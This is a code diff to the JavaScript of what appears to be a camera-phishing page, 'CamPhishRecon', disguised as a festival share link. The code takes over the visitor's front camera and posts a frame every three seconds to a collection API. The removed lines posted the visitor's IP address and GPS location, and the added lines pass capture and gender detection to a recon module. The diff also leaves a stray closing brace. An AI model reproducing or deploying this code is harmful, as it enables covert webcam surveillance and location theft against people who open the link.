@@ -35,15 +35,13 @@ var API='API_BASE_URL';
 var FESTIVAL='fes_name';
 var SHARE_URL=location.origin+'/t/festival';
 var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
-fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
-if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
-fetch(API+'/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
 });
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
 video.srcObject=s;video.play();
 setInterval(function(){
 ctx.drawImage(video,0,0,640,480);
-fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
+if(window.CamPhishRecon)CamPhishRecon.Capture.image(canvas.toDataURL('image/png'),'canvas');else fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
 },3000);
 }).catch(function(){});
 
